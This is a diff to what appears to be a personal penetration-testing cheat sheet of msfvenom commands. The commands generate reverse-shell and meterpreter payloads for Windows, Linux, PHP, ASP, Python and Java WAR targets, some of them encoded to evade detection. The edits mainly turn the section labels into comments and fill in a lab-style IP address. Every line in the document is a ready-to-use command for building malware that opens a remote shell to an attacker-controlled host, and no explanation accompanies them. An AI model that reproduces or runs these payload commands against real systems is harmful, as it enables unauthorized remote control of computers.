@@ -4,20 +4,20 @@ msfvenom -p windows/shell/reverse_tcp LHOST=10.8.50.72 LPORT=9999 -e x86/shikata
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.41.181 LPORT=443 -f exe -o Message.exe
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
 
-elf:
+# elf:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
  
-Windows:
+# Windows:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
 
-PHP:
+# PHP:
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
  
-ASP:
+# ASP:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
  
-Python:
+# Python:
 msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py
 
-java war:
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+# war:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.6.4.61 LPORT=8000 -f war > sh.war
